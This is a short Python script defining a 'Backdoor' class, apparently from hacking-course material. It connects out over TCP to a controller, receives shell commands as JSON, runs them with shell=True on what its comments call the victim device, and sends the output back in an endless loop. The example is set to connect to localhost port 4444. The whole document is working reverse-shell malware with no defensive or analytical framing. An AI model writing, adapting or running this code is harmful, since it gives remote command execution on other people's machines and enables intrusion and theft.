#!/usr/bin/python3

import socket, subprocess, json

class Backdoor:
    # Backdoor class
    def __init__(self, address: tuple):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect(address)

    def __del__(self):
        self.connection.close()

    def reliable_send(self, data):
        # Safety way to send data as json
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def reliable_receive(self):
        # Safety way to receive data as json, until everything income
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        # Method which executing command on victim device
        return subprocess.check_output(command, shell=True).decode()

    def run(self):
        # Method which run everythong - receiving, sendin, executing, etc.
        while True:
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)

# Example
my_backdoor = Backdoor(('127.0.0.1', 4444))
my_backdoor.run()


